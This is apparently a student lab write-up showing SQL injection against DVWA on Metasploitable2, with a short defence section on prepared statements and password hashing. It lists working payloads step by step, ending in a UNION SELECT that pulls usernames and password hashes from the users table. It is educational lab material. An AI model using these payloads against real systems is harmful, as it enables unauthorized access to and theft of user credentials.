# DVWA SQL Injection → Data Extraction

## 📌 Overview

This project demonstrates a SQL Injection attack on DVWA to extract sensitive data from the database.

---

## 🎯 Target

* DVWA (Damn Vulnerable Web Application)
* Metasploitable2

---

## ⚙️ Steps

### 1. Normal Input Test

Input:

```text
1
```

Result: Returned single user

---

### 2. SQL Injection

Payload:

```text
1' OR '1'='1' -- -
```

Result: Returned all users

---

### 3. Column Discovery

Payloads:

```text
1' ORDER BY 1 -- -
1' ORDER BY 2 -- -
1' ORDER BY 3 -- -
```

Result:

* 1 and 2 worked
* 3 caused error → 2 columns

---

### 4. UNION Injection

Payload:

```text
1' UNION SELECT 1,2 -- -
```

Result: Confirmed column positions

---

### 5. Data Extraction

Payload:

```text
1' UNION SELECT user, password FROM users -- -
```

Result:

* Extracted usernames and password hashes

Example:

```text
admin : 5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 🧠 Explanation

* SQL Injection allows attackers to manipulate database queries
* UNION is used to extract additional data
* Weak input validation leads to full data exposure

---

## 🛡️ Defense

### Input Validation

```php
if(!is_numeric($id)) reject;
```

### Prepared Statements

```php
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### Password Security

```php
password_hash($password, PASSWORD_BCRYPT);
```

---

## 🔥 Result

Full database data extraction:

* Usernames
* Password hashes

---

## 📸 Screenshots

(Add your screenshots here)

---

👨‍💻 Author: Danar
🎯 Goal: Cybersecurity Specialist
